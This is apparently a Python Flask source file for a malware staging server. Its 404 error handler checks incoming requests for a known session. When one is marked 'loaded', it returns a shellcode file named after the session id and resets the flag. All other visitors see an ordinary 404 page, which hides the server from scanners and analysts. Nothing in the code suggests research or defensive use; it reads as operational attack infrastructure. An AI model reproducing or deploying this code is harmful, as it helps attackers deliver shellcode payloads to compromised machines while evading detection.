
from flask import request, make_response, render_template, send_from_directory
from custom import FindSession
from app import db, app


@app.errorhandler(404)
def default(t):
    print("[+] Request from: " +
          request.headers.get('X-Forwarded-For', request.remote_addr))
    # Try and find the session from the request
    session = FindSession(request)
    if session is not None:
        print("[+] Session found")
        # check if the session is loaded
        if session.loaded:
            print("[+] Session is loaded")
            response = make_response(send_from_directory(
                'shellcode', '{0}.bin'.format(session.id)))
            # update loaded to false
            session.loaded = False
            with app.app_context():
                db.session.commit()

            return response
        else:
            print("[+] Session is not loaded")
            return make_response(render_template("404.html"), 404)
    else:
        print("[!] Session not found")
        return make_response(render_template("404.html"), 404)
